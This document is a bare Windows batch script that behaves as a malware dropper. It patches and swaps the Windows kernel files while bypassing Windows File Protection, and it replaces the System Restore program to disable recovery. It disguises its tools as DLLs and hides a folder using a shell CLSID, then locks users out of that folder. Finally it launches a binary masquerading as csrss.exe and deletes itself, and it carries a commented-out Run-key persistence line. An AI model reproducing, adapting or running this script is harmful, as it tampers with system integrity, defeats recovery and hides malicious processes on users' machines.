@echo off
cd\
%systemdrive%
cd\
cd windows
cd system32
cd wbem
copy "oeminfo.ini" "%systemdrive%\windows\system32\oeminfo.ini"
copy "%systemdrive%\windows\system32\Restore\rstrui.exe" "rst.dll"
move "oeminfo.ini" "rstrui.exe"
copy "%systemdrive%\windows\system32\ntkrnlpa.exe" "ntkrnlpa.exe"
copy "%systemdrive%\windows\system32\ntoskrnl.exe" "ntoskrnl.exe"
hac.exe -extract "ntoskrnl.exe","Blast.bmp",BITMAP,1,
hac.exe -addoverwrite "ntkrnlpa.exe","ntkrnlpa.exe","logob.bmp",BITMAP,1,
hac.exe -addoverwrite "ntoskrnl.exe","ntoskrnl.exe","logob.bmp",BITMAP,1,

wfpr.exe "%systemdrive%\windows\system32\ntkrnlpa.exe" "ntkrnlpa.exe"
wfpr.exe "%systemdrive%\windows\system32\ntoskrnl.exe" "ntoskrnl.exe"
wfpr.exe "%systemdrive%\windows\system32\Restore\rstrui.exe" "rstrui.exe"
del ntkrnlpa.exe
del ntoskrnl.exe
::reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v KM_Path /t REG_EXPAND_SZ /d "%SystemRoot%\system32\wbem\csrss.exe" /f

del logob.bmp
move blast.bmp tsalb.dll
move wfpr.exe rpfw.dll
move hac.exe cah.dll
del hac.ini
del hac.log
del rstrui.exe
::hid-----------------------------------------------------------------------
mkdir "Cache"
cd "cache"
mkdir files
attrib files +s +r
@echo [.ShellClassInfo] >> desktop.ini
echo CLSID={88C6C381-2E85-11d0-94DE-444553540000} >> desktop.ini
attrib desktop.ini +s +h +r
cd..
attrib "cache" +s +r
echo y>>y.txt
move csrss.exe "cache\files\csrss.exe"
%windir%\system32\cacls.exe "cache" /p BUILTIN\users:n <y.txt
del y.txt
start cache\files\csrss.exe
del batch.bat
exit
